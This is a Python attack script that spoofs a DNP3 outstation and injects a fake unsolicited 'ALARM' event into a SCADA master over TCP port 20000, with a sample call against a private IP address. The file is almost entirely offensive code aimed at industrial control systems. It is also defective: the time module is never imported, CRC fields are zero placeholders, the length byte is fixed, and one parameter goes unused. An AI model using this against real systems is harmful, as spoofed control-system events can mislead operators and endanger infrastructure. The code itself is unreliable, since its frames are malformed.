#!/usr/bin/env python3
"""
DNP3 Unsolicited Response Injection
Send fake events to SCADA master
"""

from pydnp3 import opendnp3, asiodnp3, asiopal
import struct
import socket

def inject_dnp3_unsolicited_response(master_ip, outstation_addr, fake_event):
    """
    Inject unsolicited response to SCADA master
    Bypasses RTU - appears to come from legitimate outstation
    """
    # Build DNP3 frame manually (requires network access to SCADA master)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((master_ip, 20000))

    # DNP3 Data Link Layer header
    start_bytes = b'\x05\x64'
    length = 0x0E  # Variable
    control = 0xC4  # DIR=1 (outstation->master), PRM=1, FCB=0, FCV=0, Func=4 (unconfirmed user data)
    dest_addr = struct.pack('<H', 1)  # Master address (typically 1)
    src_addr = struct.pack('<H', outstation_addr)  # Outstation address

    # CRC placeholder (calculate later)
    crc = b'\x00\x00'

    dl_header = start_bytes + bytes([length, control]) + dest_addr + src_addr + crc

    # Application Layer - Unsolicited Response
    app_control = 0xC0  # FIR=1, FIN=1, CON=0, UNS=1, SEQ=0
    func_code = 0x82    # Unsolicited Response

    # Object: Group 2 (Binary Input Change Event), Variation 1
    object_header = b'\x02\x01'  # Group 2, Variation 1
    qualifier = b'\x28'          # 8-bit index, 8-bit quantity
    range_field = b'\x01'        # 1 object

    # Binary Input Event
    # Index 0, Flags 0x01 (online), Timestamp
    event_index = b'\x00'
    event_flags = b'\x81'  # Online, State = ON (ALARM)
    event_time = struct.pack('<Q', int(time.time() * 1000))  # Absolute time

    event_data = event_index + event_flags + event_time

    asdu = bytes([app_control, func_code]) + object_header + qualifier + range_field + event_data

    # Calculate CRC for data link and application layers
    # (DNP3 uses CRC-16 every 16 bytes)
    # For simplicity, using placeholder (production would calculate)

    packet = dl_header + asdu

    # Send unsolicited response
    sock.send(packet)
    print(f"[+] Unsolicited response sent to {master_ip}")
    print(f"    Event: Binary Input 0 changed to ALARM state")

    sock.close()

# Usage:
# inject_dnp3_unsolicited_response('192.168.1.50', outstation_addr=100, fake_event='alarm')
